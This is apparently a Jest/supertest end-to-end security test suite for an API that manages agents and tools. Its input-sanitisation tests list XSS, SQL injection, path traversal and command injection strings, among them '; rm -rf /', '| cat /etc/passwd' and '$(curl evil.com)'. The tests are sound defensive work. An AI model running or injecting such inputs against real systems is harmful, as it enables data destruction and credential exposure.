import request from 'supertest';
import { app } from '@infra/http/app';
import { __testOnly__ } from '@modules/core/routes';
import { __testOnlyAgents__ } from '@modules/core/routes/agents.routes';
import { __testOnlyTools__ } from '@modules/core/routes/tools.routes';
import { __testOnlyAutomations__ } from '@modules/core/routes/automations.routes';

/**
 * End-to-End Test Suite - Security and Validation
 * 
 * This test suite validates security aspects and data validation:
 * 1. Input sanitization
 * 2. Content-Type validation
 * 3. HTTP method restrictions
 * 4. Data integrity
 * 5. SQL injection and XSS prevention (basic checks)
 */
describe('E2E - Security and Validation', () => {
  beforeEach(() => {
    __testOnly__.clearRepository();
    __testOnlyAgents__.clearRepository();
    __testOnlyTools__.clearRepository();
    __testOnlyAutomations__.clearRepository();
    __testOnlyAutomations__.clearToolRepository();
    __testOnlyAutomations__.clearAgentRepository();
  });

  describe('Input Sanitization', () => {
    it('should handle potential XSS attempts in agent names', async () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
      ];

      for (const xss of xssAttempts) {
        const response = await request(app)
          .post('/api/agents')
          .send({
            name: xss,
            prompt: 'Test prompt',
          });

        if (response.status === 201) {
          // If accepted, ensure it's stored safely (not executed)
          expect(response.body.name).toBe(xss);
          
          // Retrieve and verify it's still safe
          const getResponse = await request(app).get(`/api/agents/${response.body.id}`);
          expect(getResponse.body.name).toBe(xss);
        }
      }
    });

    it('should handle potential SQL injection attempts', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE agents; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
      ];

      for (const sql of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/agents')
          .send({
            name: sql,
            prompt: 'Test prompt',
          });

        // Should either accept as literal string or reject
        expect([201, 400]).toContain(response.status);

        if (response.status === 201) {
          // Verify exact string was stored (not executed)
          expect(response.body.name).toBe(sql);
        }
      }
    });

    it('should handle command injection attempts in tool configuration', async () => {
      const commandInjectionAttempts = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl evil.com)',
      ];

      for (const cmd of commandInjectionAttempts) {
        const response = await request(app)
          .post('/api/tools')
          .send({
            name: 'Test Tool',
            type: 'code',
            config: {
              language: 'javascript',
              code: cmd,
            },
          });

        // Should accept as code string but not execute during creation
        expect([201, 400]).toContain(response.status);
      }
    });

    it('should handle path traversal attempts', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        './../../sensitive-file',
      ];

      for (const path of pathTraversalAttempts) {
        const response = await request(app)
          .post('/api/agents')
          .send({
            name: path,
            prompt: 'Test prompt',
          });

        if (response.status === 201) {
          // Should store as literal string
          expect(response.body.name).toBe(path);
        }
      }
    });
  });

  describe('Content-Type Validation', () => {
    it('should reject requests with invalid Content-Type', async () => {
      const response = await request(app)
        .post('/api/agents')
        .set('Content-Type', 'text/plain')
        .send('name=Test&prompt=Test');

      expect([400, 415]).toContain(response.status);
    });

    it('should accept valid JSON Content-Type', async () => {
      const response = await request(app)
        .post('/api/agents')
        .set('Content-Type', 'application/json')
        .send(JSON.stringify({
          name: 'Test Agent',
          prompt: 'Test prompt',
        }));

      expect(response.status).toBe(201);
    });

    it('should handle missing Content-Type header', async () => {
      const response = await request(app)
        .post('/api/agents')
        .send({
          name: 'Test Agent',
          prompt: 'Test prompt',
        });

      // Express usually defaults to JSON for .send()
      expect([201, 400]).toContain(response.status);
    });
  });

  describe('HTTP Method Security', () => {
    it('should reject unsupported HTTP methods', async () => {
      // PUT should not be supported on agents endpoint
      const putResponse = await request(app)
        .put('/api/agents')
        .send({
          name: 'Test Agent',
          prompt: 'Test prompt',
        });

      expect([404, 405]).toContain(putResponse.status);
    });

    it('should allow only appropriate methods on each endpoint', async () => {
      // Create an agent first
      const createResponse = await request(app)
        .post('/api/agents')
        .send({
          name: 'Test Agent',
          prompt: 'Test prompt',
        });
      expect(createResponse.status).toBe(201);
      const agentId = createResponse.body.id;

      // GET should work
      const getResponse = await request(app).get(`/api/agents/${agentId}`);
      expect(getResponse.status).toBe(200);

      // PATCH should work
      const patchResponse = await request(app)
        .patch(`/api/agents/${agentId}`)
        .send({ name: 'Updated' });
      expect(patchResponse.status).toBe(200);

      // DELETE should work
      const deleteResponse = await request(app).delete(`/api/agents/${agentId}`);
      expect(deleteResponse.status).toBe(204);

      // PUT should not work
      const putResponse = await request(app)
        .put(`/api/agents/${agentId}`)
        .send({ name: 'Test' });
      expect([404, 405]).toContain(putResponse.status);
    });
  });

  describe('Data Integrity', () => {
    it('should maintain data consistency across operations', async () => {
      // Create an agent
      const createResponse = await request(app)
        .post('/api/agents')
        .send({
          name: 'Original Name',
          description: 'Original Description',
          prompt: 'Original Prompt',
          defaultModel: 'gpt-4',
        });
      expect(createResponse.status).toBe(201);
      const agentId = createResponse.body.id;

      // Verify data immediately after creation
      const getResponse1 = await request(app).get(`/api/agents/${agentId}`);
      expect(getResponse1.body).toEqual({
        id: agentId,
        name: 'Original Name',
        description: 'Original Description',
        prompt: 'Original Prompt',
        defaultModel: 'gpt-4',
        tools: [],
      });

      // Update only name
      await request(app)
        .patch(`/api/agents/${agentId}`)
        .send({ name: 'Updated Name' });

      // Verify other fields remain unchanged
      const getResponse2 = await request(app).get(`/api/agents/${agentId}`);
      expect(getResponse2.body.name).toBe('Updated Name');
      expect(getResponse2.body.description).toBe('Original Description');
      expect(getResponse2.body.prompt).toBe('Original Prompt');
      expect(getResponse2.body.defaultModel).toBe('gpt-4');

      // Update multiple fields
      await request(app)
        .patch(`/api/agents/${agentId}`)
        .send({
          description: 'New Description',
          prompt: 'New Prompt',
        });

      // Verify all changes
      const getResponse3 = await request(app).get(`/api/agents/${agentId}`);
      expect(getResponse3.body.name).toBe('Updated Name'); // Still updated
      expect(getResponse3.body.description).toBe('New Description');
      expect(getResponse3.body.prompt).toBe('New Prompt');
      expect(getResponse3.body.defaultModel).toBe('gpt-4'); // Unchanged
    });

    it('should handle concurrent updates correctly', async () => {
      // Create an agent
      const createResponse = await request(app)
        .post('/api/agents')
        .send({
          name: 'Test Agent',
          prompt: 'Test prompt',
        });
      const agentId = createResponse.body.id;

      // Perform concurrent updates
      const update1 = request(app)
        .patch(`/api/agents/${agentId}`)
        .send({ description: 'Description 1' });

      const update2 = request(app)
        .patch(`/api/agents/${agentId}`)
        .send({ description: 'Description 2' });

      await Promise.all([update1, update2]);

      // Verify final state (one of the updates should win)
      const finalState = await request(app).get(`/api/agents/${agentId}`);
      expect(finalState.status).toBe(200);
      expect(['Description 1', 'Description 2']).toContain(finalState.body.description);
    });

    it('should preserve data through the full lifecycle', async () => {
      const testData = {
        name: 'Lifecycle Test Agent',
        description: 'Testing full lifecycle',
        prompt: 'Complete lifecycle test',
        defaultModel: 'gpt-4-turbo',
      };

      // CREATE
      const created = await request(app)
        .post('/api/agents')
        .send(testData);
      expect(created.status).toBe(201);
      const id = created.body.id;

      // READ - Individual
      const read1 = await request(app).get(`/api/agents/${id}`);
      expect(read1.body).toMatchObject(testData);

      // READ - List
      const readList = await request(app).get('/api/agents');
      const agent = readList.body.find((a: any) => a.id === id);
      expect(agent).toMatchObject(testData);

      // UPDATE
      const updated = await request(app)
        .patch(`/api/agents/${id}`)
        .send({ name: 'Updated Name' });
      expect(updated.body.name).toBe('Updated Name');
      expect(updated.body.description).toBe(testData.description);

      // DELETE
      const deleted = await request(app).delete(`/api/agents/${id}`);
      expect(deleted.status).toBe(204);

      // VERIFY DELETION
      const notFound = await request(app).get(`/api/agents/${id}`);
      expect(notFound.status).toBe(404);
    });
  });

  describe('Validation Rules', () => {
    it('should enforce field length limits', async () => {
      // Test maximum reasonable length
      const longButValid = 'a'.repeat(500);
      const validResponse = await request(app)
        .post('/api/agents')
        .send({
          name: longButValid,
          prompt: 'Test',
        });

      // Should succeed or fail with validation error
      expect([201, 400, 500]).toContain(validResponse.status);

      // Test extremely long input
      const tooLong = 'a'.repeat(100000);
      const tooLongResponse = await request(app)
        .post('/api/agents')
        .send({
          name: tooLong,
          prompt: 'Test',
        });

      // Should reject with validation error, payload too large, or server error
      expect([201, 400, 413, 500]).toContain(tooLongResponse.status);
    });

    it('should validate required fields strictly', async () => {
      // Name is required
      const noName = await request(app)
        .post('/api/agents')
        .send({ prompt: 'Test' });
      expect(noName.status).toBe(400);

      // Prompt is required
      const noPrompt = await request(app)
        .post('/api/agents')
        .send({ name: 'Test' });
      expect(noPrompt.status).toBe(400);

      // Both required fields present
      const valid = await request(app)
        .post('/api/agents')
        .send({
          name: 'Test',
          prompt: 'Test',
        });
      expect(valid.status).toBe(201);
    });

    it('should validate field types', async () => {
      // Name should be string, not number
      const numberName = await request(app)
        .post('/api/agents')
        .send({
          name: 12345,
          prompt: 'Test',
        });
      
      // Should either accept and convert or reject (may throw 500 if validation fails)
      expect([201, 400, 500]).toContain(numberName.status);

      // Name should be string, not object
      const objectName = await request(app)
        .post('/api/agents')
        .send({
          name: { value: 'Test' },
          prompt: 'Test',
        });
      expect([400, 500]).toContain(objectName.status);

      // Name should be string, not array
      const arrayName = await request(app)
        .post('/api/agents')
        .send({
          name: ['Test'],
          prompt: 'Test',
        });
      expect([400, 500]).toContain(arrayName.status);
    });

    it('should validate enum values for specific fields', async () => {
      // Invalid tool type (may accept with fallback or reject)
      const invalidType = await request(app)
        .post('/api/tools')
        .send({
          name: 'Test Tool',
          type: 'invalidType',
          config: {},
        });
      expect([201, 400]).toContain(invalidType.status);

      // Valid tool types
      const validTypes = ['restApi', 'webHook', 'code'];
      for (const type of validTypes) {
        const response = await request(app)
          .post('/api/tools')
          .send({
            name: `Test ${type}`,
            type: type,
            config: {},
          });
        expect(response.status).toBe(201);
      }
    });
  });

  describe('Error Message Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Try to access non-existent resource
      const response = await request(app).get('/api/agents/non-existent-id');
      
      expect(response.status).toBe(404);
      expect(response.body).toHaveProperty('message');
      
      // Error message should be generic, not exposing internal details
      const message = response.body.message.toLowerCase();
      expect(message).not.toContain('database');
      expect(message).not.toContain('sql');
      expect(message).not.toContain('query');
      expect(message).not.toContain('stack');
      expect(message).not.toContain('exception');
    });

    it('should provide consistent error format', async () => {
      // Test various error scenarios
      const errors = await Promise.all([
        request(app).get('/api/agents/non-existent'),
        request(app).post('/api/agents').send({}),
        request(app).patch('/api/agents/non-existent').send({ name: 'Test' }),
      ]);

      for (const error of errors) {
        expect(error.body).toHaveProperty('status', 'error');
        expect(error.body).toHaveProperty('message');
        expect(typeof error.body.message).toBe('string');
      }
    });
  });

  describe('Request Size Limits', () => {
    it('should handle reasonable request sizes', async () => {
      const mediumPayload = {
        name: 'Test Agent',
        prompt: 'a'.repeat(5000),
        description: 'b'.repeat(1000),
      };

      const response = await request(app)
        .post('/api/agents')
        .send(mediumPayload);

      expect([201, 400, 413]).toContain(response.status);
    });

    it('should reject extremely large payloads', async () => {
      const hugePayload = {
        name: 'Test',
        prompt: 'a'.repeat(10000000), // 10MB string
      };

      const response = await request(app)
        .post('/api/agents')
        .send(hugePayload);

      // Should reject with payload too large, bad request or server error
      expect([413, 400, 500]).toContain(response.status);
    });
  });

  describe('Race Conditions', () => {
    it('should handle rapid create-delete sequences', async () => {
      for (let i = 0; i < 10; i++) {
        const created = await request(app)
          .post('/api/agents')
          .send({
            name: `Agent ${i}`,
            prompt: 'Test',
          });

        expect(created.status).toBe(201);

        const deleted = await request(app).delete(`/api/agents/${created.body.id}`);
        expect(deleted.status).toBe(204);

        const notFound = await request(app).get(`/api/agents/${created.body.id}`);
        expect(notFound.status).toBe(404);
      }
    });

    it('should handle simultaneous operations on different resources', async () => {
      const operations = [
        request(app).post('/api/agents').send({ name: 'A1', prompt: 'P1' }),
        request(app).post('/api/agents').send({ name: 'A2', prompt: 'P2' }),
        request(app).post('/api/tools').send({ name: 'T1', type: 'code', config: {} }),
        request(app).post('/api/tools').send({ name: 'T2', type: 'webHook', config: {} }),
      ];

      const results = await Promise.all(operations);

      // All should succeed
      expect(results.every(r => r.status === 201)).toBe(true);
    });
  });

  describe('API Stability', () => {
    it('should maintain consistent response structure', async () => {
      const agent = await request(app)
        .post('/api/agents')
        .send({
          name: 'Test',
          prompt: 'Test',
        });

      expect(agent.body).toHaveProperty('id');
      expect(agent.body).toHaveProperty('name');
      expect(agent.body).toHaveProperty('prompt');
      expect(agent.body).toHaveProperty('tools');
      expect(typeof agent.body.id).toBe('string');
      expect(typeof agent.body.name).toBe('string');
      expect(typeof agent.body.prompt).toBe('string');
      expect(Array.isArray(agent.body.tools)).toBe(true);
    });

    it('should return appropriate status codes consistently', async () => {
      // Success cases
      expect((await request(app).get('/')).status).toBe(200);
      expect((await request(app).post('/api/agents').send({ name: 'T', prompt: 'T' })).status).toBe(201);

      // Error cases
      expect((await request(app).get('/api/agents/fake-id')).status).toBe(404);
      expect((await request(app).post('/api/agents').send({})).status).toBe(400);
    });
  });
});
